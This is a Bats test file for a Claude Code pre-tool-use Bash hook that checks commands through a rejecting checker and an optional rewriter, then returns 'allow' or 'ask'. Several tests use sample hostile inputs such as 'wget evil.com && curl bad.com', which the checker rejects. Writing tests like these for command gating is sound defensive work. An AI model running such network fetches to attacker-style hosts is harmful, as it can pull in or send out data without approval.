bats_load_library 'helper'

SCRIPT="$BATS_TEST_DIRNAME/../preToolUse-Bash"

setup() {
  bats_tmp_dir
  export CLAUDE_HOOKS_LOG_DIR="$BATS_TMP_DIR"
  export CLAUDE_SESSIONS_DIR="$BATS_TMP_DIR"
}

teardown() { bats_cleanup; }

@test "allow with updatedInput when solkan allows and RTK does not rewrite" {
  preToolUse-Bash-solkan() { print '{"isAllowed":true,"commands":{"allowed":["echo"],"rejected":[]}}'; }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "echo hello" ]
}

@test "allow with updatedInput.command when solkan allows and RTK rewrites" {
  preToolUse-Bash-solkan() { print '{"isAllowed":true,"commands":{"allowed":["git"],"rejected":[]}}'; }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "rtk $1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]
}

@test "ask permissionDecision with updatedInput when solkan refuses and RTK does not rewrite" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "wget evil.com" ]
}

@test "ask permissionDecision with updatedInput.command when solkan refuses and RTK rewrites" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "rtk $1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"git status"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]
}

@test "permissionDecisionReason lists rejected commands when solkan refuses" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget","curl"]}}'
    return 1
  }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget, curl ❌" ]
}

@test "ask shows single rejected command" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget"]}}'
    return 1
  }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget ❌" ]
}

@test "no systemMessage when solkan rejects" {
  preToolUse-Bash-solkan() {
    print '{"isAllowed":false,"commands":{"allowed":[],"rejected":["wget"]}}'
    return 1
  }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq '.hookSpecificOutput.systemMessage')" = "null" ]
}

@test "hook logs to CLAUDE_HOOKS_LOG_DIR" {
  preToolUse-Bash-solkan() { print '{"isAllowed":true,"commands":{"allowed":["echo"],"rejected":[]}}'; }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() { print -- "$1"; }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
  [ "$status" -eq 0 ]
  [ -f "$BATS_TMP_DIR/last-bash-input.json" ]
}

@test "no background jobs in script" {
  run grep -E '[^&]&[[:space:]]*$' "$SCRIPT"
  [ "$status" -ne 0 ]
}

@test "solkan completes before RTK starts" {
  preToolUse-Bash-solkan() {
    sleep 0.05
    print SOLKAN >>"$BATS_TMP_DIR/order.log"
    print '{"isAllowed":true}'
  }
  bats_mock preToolUse-Bash-solkan

  preToolUse-Bash-rtk() {
    print RTK >>"$BATS_TMP_DIR/order.log"
    print -- "$1"
  }
  bats_mock preToolUse-Bash-rtk

  bats_run_script "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
  [ "$status" -eq 0 ]
  [ "$(head -1 "$BATS_TMP_DIR/order.log")" = "SOLKAN" ]
}
